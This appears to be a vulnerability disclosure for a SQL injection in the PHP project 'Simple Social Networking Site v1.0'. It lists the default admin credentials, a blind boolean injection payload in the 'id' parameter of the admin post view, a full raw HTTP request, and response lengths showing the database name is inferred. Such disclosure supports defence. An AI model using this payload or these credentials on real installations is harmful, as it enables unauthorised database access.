# Simple Social Networking Site v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Vulnerability File: /sns/admin/?page=posts/view_post&id=

Vulnerability location: /sns/admin/?page=posts/view_post&id=,id

[+] Payload: /sns/admin/?page=posts/view_post&id=2%27%20and%20length(database())%20=6--+ // Leak place ---> id

Current database name: sns_db,length is 6

```sql
GET /sns/admin/?page=posts/view_post&id=2%27%20and%20length(database())%20=6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 5, Content-Length: 27535

![image](https://user-images.githubusercontent.com/54017627/166929149-d05b7d60-ea35-42c7-adf3-2831fe6a1905.png)

![image](https://user-images.githubusercontent.com/54017627/166928929-82e4bf6d-173a-4555-9c2d-2b0e3e0d1442.png)

When length (database ()) = 6, Content-Length: 31610

![image](https://user-images.githubusercontent.com/54017627/166928977-dc4060ac-4750-483d-b51a-972459f6492b.png)

![image](https://user-images.githubusercontent.com/54017627/166928874-e170598a-613b-40ce-a5b1-583191bea745.png)
